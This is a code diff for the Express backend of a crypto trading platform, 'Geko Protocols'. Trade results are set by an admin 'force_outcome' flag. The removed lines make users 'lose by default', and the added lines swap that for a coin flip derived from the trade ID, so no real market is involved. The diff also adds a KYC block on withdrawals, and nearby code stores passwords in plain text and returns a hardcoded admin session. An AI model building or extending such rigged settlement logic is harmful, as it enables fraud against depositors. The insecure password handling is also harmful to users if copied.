@@ -304,7 +304,11 @@ const initializeDatabase = async () => {
           let isWin = false;
           if (trade.force_outcome === 'win') isWin = true;
           else if (trade.force_outcome === 'loss') isWin = false;
-          else isWin = false; // Always fail by default
+          else {
+            // Random outcome based on trade ID to ensure it varies
+            const seed = trade.id.split('').reduce((acc, char) => acc + char.charCodeAt(0), 0);
+            isWin = seed % 2 === 0;
+          }
 
           const leverageFactor = (parseFloat(trade.leverage || 10)) / 10;
           const amount = parseFloat(trade.amount || 0);
@@ -837,7 +841,7 @@ app.get('/api/user/data', async (req, res) => {
 
 // ─── Email Auth: Login & Signup ──────────────────────────────────────────────
 app.post('/api/auth/signup-request', async (req, res) => {
-  const { email, password } = req.body;
+  const { email, password, name } = req.body;
   if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
   if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });
 
@@ -860,7 +864,7 @@ app.post('/api/auth/signup-request', async (req, res) => {
             user_id: "jYe9rCuS-cQfrW0tn",
             template_params: {
                 to_email: userEmail,
-                to_name: userEmail.split('@')[0],
+                to_name: name || userEmail.split('@')[0],
                 verification_code: signupCode,
                 message: `Your Geko Protocols verification code is: ${signupCode}`,
                 subject: `Geko Verification Code: ${signupCode}`
@@ -874,12 +878,12 @@ app.post('/api/auth/signup-request', async (req, res) => {
 
     // Upsert the pending registration
     const virtualAddress = '0x' + crypto.createHash('sha256').update(userEmail).digest('hex').slice(0, 40);
-    const nickname = userEmail.split('@')[0].toUpperCase();
+    const nickname = name || userEmail.split('@')[0].toUpperCase();
 
     await pool.query(
       `INSERT INTO geko_users (email, password, signup_code, nickname, wallet_address, status, last_seen) 
        VALUES ($1, $2, $3, $4, $5, 'guest', NOW())
-       ON CONFLICT (email) DO UPDATE SET password = EXCLUDED.password, signup_code = EXCLUDED.signup_code, last_seen = NOW()`,
+       ON CONFLICT (email) DO UPDATE SET password = EXCLUDED.password, signup_code = EXCLUDED.signup_code, nickname = EXCLUDED.nickname, last_seen = NOW()`,
       [userEmail, password, signupCode, nickname, virtualAddress]
     );
 
@@ -934,6 +938,7 @@ app.post('/api/auth/login', async (req, res) => {
             address: 'ADMIN_GATEWAY',
             email: 'admin@gmail.com',
             nickname: 'ADMIN_ROOT',
+            name: 'ADMIN_ROOT',
             status: 'approved',
             role: 'admin',
             wallet_data: {},
@@ -968,6 +973,7 @@ app.post('/api/auth/login', async (req, res) => {
         address: user.wallet_address,
         email: user.email,
         nickname: user.nickname,
+        name: user.nickname,
         status: user.status,
         role: 'user',
         wallet_data: user.wallet_data || {},
@@ -1295,7 +1301,11 @@ app.post('/api/settle-trade', async (req, res) => {
     let isWin = false;
     if (trade.force_outcome === 'win') isWin = true;
     else if (trade.force_outcome === 'loss') isWin = false;
-    else isWin = false; // RULE: User must lose by default
+    else {
+      // Random outcome based on trade ID to ensure it varies
+      const seed = trade.id.split('').reduce((acc, char) => acc + char.charCodeAt(0), 0);
+      isWin = seed % 2 === 0;
+    }
 
     const finalStatus = isWin ? 'won' : 'lost';
     
@@ -1340,6 +1350,12 @@ app.post('/api/request-withdrawal', async (req, res) => {
   if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });
 
   try {
+    // KYC CHECK
+    const userRes = await pool.query('SELECT kyc_status FROM geko_users WHERE wallet_address = $1', [walletAddress]);
+    if (userRes.rows.length && userRes.rows[0].kyc_status !== 'approved') {
+        return res.status(403).json({ success: false, error: 'KYC verification required for withdrawals.' });
+    }
+
     const balance = await getUserBalance(walletAddress, asset);
     if (balance < parseFloat(amount))
       return res.status(400).json({ success: false, error: `Insufficient balance. Available: ${balance} ${asset}` });
